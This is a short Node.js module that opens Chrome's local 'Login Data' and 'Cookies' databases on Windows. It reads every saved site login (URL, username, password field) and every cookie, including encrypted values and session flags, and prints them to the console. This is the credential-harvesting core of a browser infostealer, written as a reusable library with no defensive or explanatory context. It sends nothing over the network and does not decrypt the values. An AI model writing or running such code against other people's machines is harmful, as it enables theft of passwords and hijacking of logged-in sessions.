const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const defaultLoginDataPath = path.join(process.env.LOCALAPPDATA, '\\Google\\Chrome\\User Data\\Default\\Login Data');
const defaultCookiesPath = path.join(process.env.LOCALAPPDATA, '\\Google\\Chrome\\User Data\\Default\\Cookies');

module.exports.getLoginData = function (dataPath) {
  if (!dataPath) {
    dataPath = defaultLoginDataPath;
  }

  const database = new sqlite3.Database(dataPath, sqlite3.OPEN_READONLY, function (error) {
    if (error) {
      console.error(error);

      return;
    }

    database.all('SELECT * FROM logins', function (error, rows) {
      if (error) {
        console.error(error);

        return;
      }

      let loginData = [{}];

      for (let index = 0; index < rows.length; index++) {
        let row = rows[index];

        loginData.push({
          originUrl: row.origin_url,
          username: row.username_value,
          password: row.password_value
        });
      }

      console.log(loginData);
    });
  });
};

module.exports.getCookies = function (dataPath) {
  if (!dataPath) {
    dataPath = defaultCookiesPath;
  }

  const database = new sqlite3.Database(dataPath, sqlite3.OPEN_READONLY, function (error) {
    if (error) {
      console.error(error);

      return;
    }

    database.all('SELECT * FROM cookies', function (error, rows) {
      if (error) {
        console.error(error);

        return;
      }

      let cookies = [{}];

      for (let index = 0; index < rows.length; index++) {
        let row = rows[index];

        cookies.push({
          hostKey: row.host_key,
          name: row.name,
          value: row.encrypted_value,
          path: row.path,
          expiresUtc: row.expires_utc,
          secure: Boolean(row.secure),
          httpOnly: Boolean(row.httponly),
          lastAccessUtc: row.last_access_utc,
          expired: Boolean(row.has_expires),
          persistent: Boolean(row.persistent),
          priority: Boolean(row.priority)
        });
      }

      console.log(cookies);
    });
  });
};